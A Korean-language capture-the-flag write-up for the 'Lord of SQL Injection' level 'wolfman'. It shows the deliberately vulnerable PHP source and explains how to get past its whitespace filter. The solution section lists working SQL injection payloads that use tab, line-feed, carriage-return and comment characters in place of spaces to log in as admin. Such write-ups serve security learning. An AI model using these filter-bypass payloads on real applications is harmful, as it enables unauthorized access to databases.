# Lord of SQL Injection No.5 - wolfman

## 문제 출제의도

공백문자를 우회하여 SQL문을 조작할 수 있는지 확인한다.

## 소스 코드 분석

```php
<?php 
    include "./config.php"; 
    login_chk(); 
    dbconnect(); 
    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
    $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysql_fetch_array(mysql_query($query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("wolfman"); 
    highlight_file(__FILE__); 
?>
```
id = 'quest'를 무력화시키고 admin값으로 바꾸어주어야한다.
-----
```php
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
```
* preg_match에서 space_bar를 필터링 한다.

## 문제 해결방안
    
### 공백을 대신할 수 있는 방안을 사용한다.

…?pw=' or id='admin' 을 해주면 되지만 띄어쓰기가 안되므로 띄어쓰기의 역할을 하는 것들을 이용하여 띄어쓰기 공간을 채워준다.

* 띄어쓰기 대신 사용가능한 %09 으로 …?pw='%09or%09id='admin을 해주게 되면 성공한다

* lineFeed(\n)으로 띄어쓰기를 대신하여 %0a를 사용한다. >> …?pw='%0aor%0aid='admin을 하게 되면 문제풀이에 성공한다.

* Carrage Return을 이용하여 띄어쓰기를 대신한다. %0d >> …?pw='%0dor%0did='admin을 하게 되면 문제풀이에 성공한다.

* 주석을 이용하여 띄어쓰기를 대신한다. /**/ >> …?pw='/**/or/**/id='admin을 하게 되면 문제풀이에 성공한다.